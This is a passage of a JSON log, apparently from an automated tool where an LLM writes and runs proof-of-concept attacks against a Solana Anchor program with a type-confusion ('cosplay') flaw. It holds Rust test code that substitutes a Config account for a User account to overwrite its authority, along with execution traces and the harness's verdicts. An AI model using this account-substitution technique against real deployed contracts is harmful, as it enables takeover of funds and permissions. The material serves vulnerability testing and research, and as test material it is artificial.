+        "elapsed_s": 1.7
+      },
+      "verdict": null,
+      "reason": "o baseline 'initialize legitimo com User valido' falhou com UnknownError(ProgramFailedToComplete); o uso legitimo precisa ter sucesso (revise layout das contas, seeds, flags de assinatura/escrita e argumentos)"
+    },
+    {
+      "attempt": 5,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2892,
+        "completion_tokens": 655,
+        "latency_s": 3.82
+      },
+      "raw": "{\"plan\": \"O baseline falhou porque a conta User foi montada com um discriminador Anchor de 8 bytes, mas o programa le os dados manualmente com try_from_slice esperando o campo bool `discriminator` no byte 0. Vou montar a conta User com o layout real da struct (bool + Pubkey, sem discriminador Anchor) para o baseline ter sucesso. No ataque, forneco uma conta de outro tipo (Config) cujo primeiro byte tambem e true, fazendo o programa interpreta-la como User e sobrescrever o campo authority. O efeito mede se a authority armazenada na conta Config foi sobrescrita com a chave do atacante.\", \"scenario\": \"let authority = Pubkey::new_unique();\\nlet attacker = Pubkey::new_unique();\\n\\n// Conta User valida para o baseline: layout real da struct User (bool + Pubkey), sem discriminador Anchor\\nlet user_key = Pubkey::new_unique();\\nlet user_data = (true, authority).bytes();\\nlet user_account = account(&env.program_id, &user_data, None);\\n\\nlet baseline_ix = env.anchor_ix(\\\"initialize\\\", &(), vec![\\n    AccountMeta::new(user_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n]);\\nlet baseline_accounts = vec![\\n    (user_key, user_account.clone()),\\n    (authority, wallet(1_000_000_000)),\\n];\\nlet _baseline_result = env.baseline(\\\"initialize legitimo com User valido\\\", &baseline_ix, &baseline_accounts);\\n\\n// Ataque: conta de outro tipo (Config) cujo primeiro byte tambem e true, interpretada como User\\nlet config_key = Pubkey::new_unique();\\nlet config_data = (true, Pubkey::new_unique()).bytes();\\nlet config_account = account(&env.program_id, &config_data, None);\\n\\nlet attack_ix = env.anchor_ix(\\\"initialize\\\", &(), vec![\\n    AccountMeta::new(config_key, false),\\n    AccountMeta::new_readonly(attacker, true),\\n]);\\nlet attack_accounts = vec![\\n    (config_key, config_account.clone()),\\n    (attacker, wallet(1_000_000_000)),\\n];\\nlet attack_result = env.attack(\\\"initialize com conta Config no lugar de User\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    let after_data = after(&attack_result, &config_key).data();\\n    let stored_authority = read_pubkey(after_data, 1);\\n    env.effect(\\\"authority da conta Config sobrescrito com a chave do atacante\\\", stored_authority == attacker);\\n}\"}",
+      "plan": "O baseline falhou porque a conta User foi montada com um discriminador Anchor de 8 bytes, mas o programa le os dados manualmente com try_from_slice esperando o campo bool `discriminator` no byte 0. Vou montar a conta User com o layout real da struct (bool + Pubkey, sem discriminador Anchor) para o baseline ter sucesso. No ataque, forneco uma conta de outro tipo (Config) cujo primeiro byte tambem e true, fazendo o programa interpreta-la como User e sobrescrever o campo authority. O efeito mede se a authority armazenada na conta Config foi sobrescrita com a chave do atacante.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet attacker = Pubkey::new_unique();\n\n// Conta User valida para o baseline: layout real da struct User (bool + Pubkey), sem discriminador Anchor\nlet user_key = Pubkey::new_unique();\nlet user_data = (true, authority).bytes();\nlet user_account = account(&env.program_id, &user_data, None);\n\nlet baseline_ix = env.anchor_ix(\"initialize\", &(), vec![\n    AccountMeta::new(user_key, false),\n    AccountMeta::new_readonly(authority, true),\n]);\nlet baseline_accounts = vec![\n    (user_key, user_account.clone()),\n    (authority, wallet(1_000_000_000)),\n];\nlet _baseline_result = env.baseline(\"initialize legitimo com User valido\", &baseline_ix, &baseline_accounts);\n\n// Ataque: conta de outro tipo (Config) cujo primeiro byte tambem e true, interpretada como User\nlet config_key = Pubkey::new_unique();\nlet config_data = (true, Pubkey::new_unique()).bytes();\nlet config_account = account(&env.program_id, &config_data, None);\n\nlet attack_ix = env.anchor_ix(\"initialize\", &(), vec![\n    AccountMeta::new(config_key, false),\n    AccountMeta::new_readonly(attacker, true),\n]);\nlet attack_accounts = vec![\n    (config_key, config_account.clone()),\n    (attacker, wallet(1_000_000_000)),\n];\nlet attack_result = env.attack(\"initialize com conta Config no lugar de User\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    let after_data = after(&attack_result, &config_key).data();\n    let stored_authority = read_pubkey(after_data, 1);\n    env.effect(\"authority da conta Config sobrescrito com a chave do atacante\", stored_authority == attacker);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "initialize legitimo com User valido",
+            "result": "Success",
+            "compute_units": 1207,
+            "account_flags": "-w,sr",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 33,
+                "head": "0100000000000000",
+                "digest": "491a430b19faf7bd",
+                "post": "010000000000000002000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "initialize com conta Config no lugar de User",
+            "result": "Success",
+            "compute_units": 1207,
+            "account_flags": "-w,sr",
+            "ix_head": "afaf6d1f0d989bed",
+            "accounts": [
+              {
+                "key": "111111131h1vYVSYuKP6AhS86fbRdMw9XHiZAvAaj",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 33,
+                "head": "0100000000000000",
+                "digest": "b86b8819554efd92",
+                "post": "010000000000000003000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "authority da conta Config sobrescrito com a chave do atacante",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 1207 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 1207 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.7
+      },
+      "verdict": null,
+      "reason": "o ataque nao exercita a hipotese de COSPLAY: e preciso que uma conta do ataque tem discriminador (8 primeiros bytes) diferente da conta na mesma posicao do baseline. Mantenha o baseline como uso legitimo e faca no ataque exatamente essa mudanca."
+    }
+  ],
+  "case_id": "SL-04-SEC",
+  "static_finding": {
+    "category": "COSPLAY",
+    "confidence": "high",
+    "evidence": "let mut user = User::try_from_slice(&ctx.accounts.user.data.borrow()).unwrap();\nif !user.discriminator {\n    return Err(ProgramError::InvalidAccountData.into());\n}",
+    "explanation": "A desserializacao e feita manualmente a partir de `AccountInfo` sem usar o wrapper `Account<'info, T>` do Anchor, que injetaria e validaria um discriminador de 8 bytes. O campo `discriminator` e um booleano simples que pode ser facilmente forjado, permitindo que dados de outro tipo de conta sejam interpretados como `User`.",
+    "attack_hypothesis": "Um atacante fornece uma conta cujos dados foram criados para outro tipo de conta (por exemplo, uma conta de configuracao com um booleano `true` no inicio) e o programa a interpreta como `User`, sobrescrevendo campos indevidamente."
+  }
+}
